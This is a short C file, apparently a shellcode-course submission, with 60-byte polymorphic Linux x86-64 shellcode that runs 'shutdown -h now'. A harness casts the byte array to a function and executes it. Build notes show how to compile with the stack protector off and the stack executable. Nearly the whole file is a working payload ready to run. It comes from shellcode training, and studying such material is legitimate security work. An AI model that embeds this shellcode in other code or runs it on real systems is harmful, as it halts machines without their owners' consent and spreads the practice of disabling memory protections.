/*
*
* Author : SLAE64-PA-6470 (kahlon81)
* Date : 2018/02/21
*
* Linux/x86-64 - shutdown -h now x86_64 Shellcode - 60 bytes
*
* for i in $(objdump -d shellcode-877-polymorphic.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
*
* gcc -fno-stack-protector -z execstack shellcode-877-polymorphic.c -o shellcode-877-poly
*
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = "\x48\x31\xc0\x48\x31\xd2\x50\x6a\x77\x66\x68\x6e\x6f\x48\x89\xe3\x50\x66\x68\x2d\x68\x48\x89\xe1\x50\xeb\x0e\x5f\x52\x53\x51\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05\xe8\xed\xff\xff\xff\x2f\x73\x62\x69\x6e\x2f\x73\x68\x75\x74\x64\x6f\x77\x6e";

main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}